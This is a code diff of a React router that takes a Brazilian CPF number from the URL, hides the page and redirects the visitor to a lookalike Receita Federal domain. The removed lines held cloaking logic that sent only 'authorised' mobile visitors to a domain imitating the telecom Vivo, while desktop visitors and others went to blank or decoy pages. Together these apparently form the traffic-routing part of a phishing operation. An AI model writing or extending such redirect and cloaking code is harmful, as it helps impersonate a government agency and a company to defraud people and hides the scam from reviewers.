@@ -17,62 +17,21 @@ function Router() {
     const cpf = cpfMatch[1];
     const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
     
-    // Esconder página e redirecionar
+    // Esconder página e redirecionar instantaneamente
     document.body.style.display = 'none';
+    document.body.style.opacity = '0';
+    document.documentElement.style.backgroundColor = 'transparent';
+    
+    console.log('Redirecionando CPF para Receita Federal:', receitaUrl);
     window.location.href = receitaUrl;
     
     return null;
   }
   
-  // Na rota principal, verificamos se tem o parâmetro dashboard
-  // Se não tiver, redirecionamos instantaneamente
-  if (currentPath === '/' && !window.location.search.includes('dashboard=true')) {
-    const Instant = () => {
-      // Lógica de redirecionamento direto (fixo) 
-      const isAuthorized = new URLSearchParams(window.location.search).get('acesso') === 'autorizado';
-      
-      // Verificar se é dispositivo móvel
-      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      
-      // Esconder completamente a página
-      document.body.style.display = 'none';
-      document.body.style.opacity = '0';
-      document.documentElement.style.backgroundColor = 'transparent';
-      
-      // Determinar destino baseado em autorização e tipo de dispositivo
-      let redirectUrl = 'https://atendimentovivo.gupy.io'; // Domínio padrão para não-autorizado
-      
-      if (isAuthorized) {
-        // Se tem parâmetro de autorização
-        if (isMobile) {
-          // Dispositivo móvel - redireciona para o domínio correto
-          redirectUrl = 'https://portal.vivo-cadastro.com?acesso=autorizado';
-        } else {
-          // Desktop - redireciona para about:blank
-          redirectUrl = 'about:blank';
-        }
-      }
-      
-      // Redirecionar imediatamente
-      setTimeout(() => {
-        window.location.href = redirectUrl;
-      }, 50);
-      
-      return null;
-    };
-    
-    return (
-      <Switch>
-        <Route path="/" component={Instant} />
-        <Route path="/dashboard" component={Dashboard} />
-        <Route component={NotFound} />
-      </Switch>
-    );
-  }
-  
+  // Para todas as outras rotas, mostrar o dashboard ou página de configuração
   return (
     <Switch>
-      <Route path="/" component={Redirector} />
+      <Route path="/" component={Dashboard} />
       <Route path="/dashboard" component={Dashboard} />
       <Route component={NotFound} />
     </Switch>
